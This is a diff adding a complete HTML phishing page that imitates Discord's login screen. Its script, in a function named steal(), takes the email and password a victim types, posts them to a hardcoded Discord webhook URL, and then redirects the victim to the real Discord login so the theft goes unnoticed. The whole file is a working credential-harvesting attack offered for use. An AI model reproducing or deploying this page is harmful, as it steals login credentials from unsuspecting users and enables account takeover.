@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Login</title>
+    <style>
+        body {
+            background: #404eed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-box {
+            background: #36393f;
+            padding: 40px;
+            border-radius: 5px;
+            width: 400px;
+            color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        h1 { font-size: 24px; text-align: center; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label {
+            display: block;
+            text-transform: uppercase;
+            font-size: 12px;
+            color: #b9bbbe;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            background: #202225;
+            border: 1px solid #202225;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        .input-group input:focus { border-color: #7289da; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover { background: #4752c4; }
+        .links { margin-top: 20px; text-align: center; font-size: 14px; }
+        .links a { color: #00aff4; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Welcome back!</h1>
+        <p style="text-align:center; color:#b9bbbe;">We're so excited to see you again!</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Email or phone number</label>
+                <input type="text" id="email" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="button" onclick="steal()">Log In</button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot your password?</a><br>
+            <a href="#">Need an account? Register</a>
+        </div>
+    </div>
+
+    <script>
+        function steal() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send to your Discord webhook
+            fetch('https://discord.com/api/webhooks/1474848215458119812/oLcFzVl0dutF5vIjWZe1AJQidFWvgxP7P3cqHfWKdVgCgUJT1EgZIHXjxnHtkwZ8fEyy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**New Discord Login**\nEmail: ${email}\nPassword: ${password}`
+                })
+            });
+
+            // Redirect to real Discord login
+            window.location.href = 'https://discord.com/login';
+        }
+    </script>
+</body>
+</html>
